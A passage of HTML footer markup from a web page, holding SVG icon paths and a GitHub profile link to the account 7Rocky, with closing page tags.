3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>